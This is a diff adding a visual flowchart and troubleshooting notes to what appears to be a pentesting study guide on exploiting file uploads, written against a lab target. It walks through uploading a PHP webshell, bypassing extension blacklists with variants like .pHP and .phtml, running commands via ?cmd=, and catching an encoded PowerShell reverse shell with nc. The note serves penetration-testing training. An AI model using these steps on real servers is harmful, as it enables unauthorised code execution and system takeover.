@@ -45,6 +45,36 @@ File upload functionality found?
 └── File accessible + executable → GET /uploads/shell.php?cmd=id
 ```
 
+## Visual Flow
+
+```mermaid
+flowchart TD
+    A["Find an upload form<br/>avatar, contest pic, case files"] --> B["Probe what is allowed<br/>upload test.txt, then a PHP webshell"]
+    B --> C{"PHP file accepted?"}
+    C -->|Blocked: PHP blacklisted| D["Bypass the filter<br/>alt ext .pHP .php5 .phtml, case change"]
+    C -->|Accepted| E["Note the upload directory<br/>e.g. /uploads/"]
+    D --> E
+    E --> F["Browse to the shell + pass a command<br/>uploads/simple-backdoor.pHP?cmd=dir"]
+    F --> G{"Command output returned?"}
+    G -->|No| H["Wrong path or still filtered<br/>gobuster uploads dir, retry bypass"]
+    G -->|Yes| I["✅ Code execution"]
+    H --> F
+    I --> J["Base64-encode a PowerShell reverse shell<br/>cmd=powershell -enc ... , nc -nvlp 4444"]
+    J --> K["🐚 Reverse shell"]
+```
+
+> [!success] What success looks like
+> The upload succeeds ("File simple-backdoor.pHP has been uploaded"), and browsing to `uploads/simple-backdoor.pHP?cmd=dir` returns a directory listing of `C:\xampp\htdocs\meteor\uploads`. The encoded PowerShell payload then lands a shell in Netcat showing `nt authority\system`.
+
+> [!danger] Common errors
+> - "PHP files are not allowed" → the blacklist checks exact extensions; try case changes (`.pHP`) or alternates (`.php5`, `.phtml`, `.phar`).
+> - Uploaded but won't execute → it landed somewhere not served as PHP, or the path is wrong; find the real uploads dir (gobuster) and confirm the URL.
+> - Reverse shell never connects → start `nc -nvlp 4444` first, and URL-encode spaces (`%20`) in the curl command. See [[🔣 Encoding Reference]].
+> Full list: [[⚠️ Common Errors & Troubleshooting]]
+
+> [!tip] Beginner note
+> A webshell is just a tiny script you upload that runs whatever command you pass it via a URL parameter (`?cmd=`). The whole game is getting that executable file past the upload filter and into a folder the server will actually run as code.
+
 ## Resources
 - [HackTricks — File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
 - [PayloadsAllTheThings — Upload Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
